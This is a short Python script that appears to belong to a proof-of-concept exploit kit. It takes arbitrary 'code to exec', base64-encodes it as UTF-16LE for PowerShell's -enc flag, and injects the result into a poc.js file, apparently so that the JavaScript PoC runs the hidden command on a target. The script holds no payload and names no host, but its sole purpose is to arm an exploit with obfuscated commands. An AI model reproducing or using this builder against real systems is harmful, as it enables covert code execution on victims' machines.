import base64

def main():
    user_input = input("[*] Code to exec: ")
    
    encoded_bytes = user_input.encode('utf-16le')
    
    base64_encoded = base64.b64encode(encoded_bytes).decode('utf-8')
    
    print("[*] output:", base64_encoded)

    poc_js_path = 'poc.js'
    
    with open(poc_js_path, 'r') as file:
        content = file.read()
    
    modified_content = content.replace('-enc ', f'-enc {base64_encoded} ', 1)
    
    with open(poc_js_path, 'w') as file:
        file.write(modified_content)

    print(f"[*] output written to js file {poc_js_path}.")

if __name__ == "__main__":
    main()
